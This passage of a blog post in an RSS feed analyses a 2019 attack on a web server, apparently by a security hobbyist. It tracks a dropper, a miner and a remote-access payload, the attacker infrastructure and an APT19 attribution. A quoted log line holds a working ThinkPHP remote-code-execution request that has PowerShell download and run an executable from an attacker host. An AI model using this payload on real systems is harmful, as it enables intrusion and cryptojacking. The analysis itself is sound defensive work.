+<pre> 124.161.103.251 - - [02 /Apr /2019: 17: 17: 41 +0200] "GET /public/index.php?s=index/thinkx5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp ; vars [1] [] = cmd.exe% 20 /c% 20powershell% 20 (new-object 20System.Net.WebClient%).DownloadFile ( 'http://fid.hognoob.se/download.exe', ' C: /Windows/temp/fbouucstzfhszdw10280.exe '); start% 20C: /Windows/temp/fbouucstzfhszdw10280.exe HTTP /1.1 "301 5" http://blog.tchernobyl.ml/public/index.php?s= index /thinkx5Capp /invokefunction & function = call_user_func_array & vars [0] = system & vars [1] [] = cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile ('http: //fid. hognoob.se/download.exe','C:/Windows/temp/fbouucstzfhszdw10280.exe');start C: /Windows/temp/fbouucstzfhszdw10280.exe "" Mozilla /4.0 (compatible; MSIE 9.0; Windows NT 6.1) "<br />
+</Pre></p>
+<p>To make it simple, this request attempts to execute a powershell command through "index.php". If the server is vulnerable, a file is downloaded, executed in memory and then deleted from disk to cover up traces.</p>
+<p>After some verifications, it would be proof of concept on a "ThinkPHP" vulnerability. It's a PHP-based web application development framework distributed under the open source Apache2 license. This framework is very popular in China, where more than 40,000 servers are running ThinkPHP (<a href = "https://securitynews.sonicwall.com/xmlpost/thinkphp-remote-code-execution-rce-bug-is-actively-being -exploited /"rel="noopener noreferrer"target =" _ blank "> source </a>)</p>
+<h3> 2°) The Dropper </h3>
+<p>First of all, the file is pretty lightweight (only 90 KB) which could mean that this is only a dropper. After being executed, it would download the real payload. This kind of process is widely used by hackers to facilitate and control the execution flow.</p>
+<p>At this point, the least we can say is that the individuals who wrote this piece of code are far from being beginners. Although I know that the program was written in C++ by looking at which libraries are loaded, I can't unfortunately say anything else about the development context. For instance, there is no debug artifacts, no comments, nothing at all except the code. Which is rare enough to emphasize it.</p>
+<p>Thus, this file succesfully passes the 6th statement of the CIA Development Tradecraft:</p>
+<blockquote><p> Raise the difficulty for analysis and reverse-engineering and removes artifacts used for attribution/origination. </p></blockquote>
+<h3> 3°) The payload </h3>
+<p>During the execution, two other files are successively downloaded and executed: nmbsawer.exe and wercplshost.exe.<br />
+One file provide persistent remote access (cmd.exe) and disables Windows Defender protection and the other one provide a cryptocurrency mining tool. I managed to identify the mining pool with a configuration file: pxi.hognoob.se:35791. Fun fact, the mining program is configured to use only 1% of the CPU load.</p>
+<p>It seems a little strange to set up the mining rate so low, but keep in mind that servers running on processors costing $ 14.000 each, 1% of the load is actually far from being nothing !</p>
+<p>Altogether, there are 6 subdomains involved in this operation:</p>
+<p><Pre><br />
+upa1.hognoob.se 195.128.127.254 ----> additional components downloaded by the dropper (SERVER A)<br />
+upa2.hognoob.se 195.128.127.254 ----> additional components downloaded by the dropper (SERVER A)<br />
+q1a.hognoob.se 195.128.127.254 ----> additional components downloaded by the dropper (SERVER A)<br />
+uio.hognoob.se 195.128.126.120 ----> ??? (SERVER C)<br />
+fid.hognoob.se 195.128.127.254 ----> initial download of the dropper (SERVER A)<br />
+pxi.hognoob.se 195.128.124.140 ----> mining pool (SERVER B)<br />
+</Pre></p>
+<p>Interestingly, some subdomains are "protected" by Cloudflare. I put "protected" with quotes because this "protection" allowed me to get the IP addresses without any problem.</p>
+<p>When we have all the IP addresses (which are three), we realize very quickly that all addresses are located in Russia. All except one:<br />
+<Pre><br />
+http://2019.ip138.com/ic.asp 117.25.157.119 ----> Control and Command (SERVER D)<br />
+</Pre></p>
+<p>This web address located in China is hard coded into an additional monitoring component downloaded by the dropper. This suggests that this is the address of the Control and Control server. In addition, the extension "asp" reinforces the hypothesis of a Web control on the botnet.</p>
+<p>You can also that "2019" in the subdomain name. After some researches, I found that each operation had its own subdomain depending on the year. The oldest I could manage to find is dating back to 2017.</p>
+<h3> Verdict </h3>
+<p>Although nothing allows us to say that this is an attack orchestrated by Russian hackers, it is obvious that most of the operation infrastructure is located in Russia.</p>
+<p>The fact that the biggest benefit of the operation is in China and the coincidence to have a vital server to the operation being also located in China is a bit intriguing.</p>
+<p>Even more intriguing is the fact that the domain used for the C&C would be attributed to <a href="https://attack.mitre.org/groups/G0073/"> APT 19 </a>. Also known as the sweet name of "Codoso Team" or "Sunshop Group". It would be a group of independent hackers who would benefit from some form of support from the Chinese government (<a href = "https://www.fireeye.fr/current-threats/apt-groups.html # apt19 "></a> source)</p>
+<p>In short, this is where my little investigations led me to learn a little more about these hackers of the shadows who are so well-known and so unknown at the same time.</p>
+<p>I hope you liked this article, feel free to send me messages via the contact form or even in comments to give me your point of view,or if you knew the same situation / a similar situation, I read them all! 🤠</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/">Analysis of a Chinese Mass Attack (ft. Codoso Team)</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
+]]></content:encoded>
+							<wfw:commentRss>https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+							</item>
+	</channel>
+</rss>
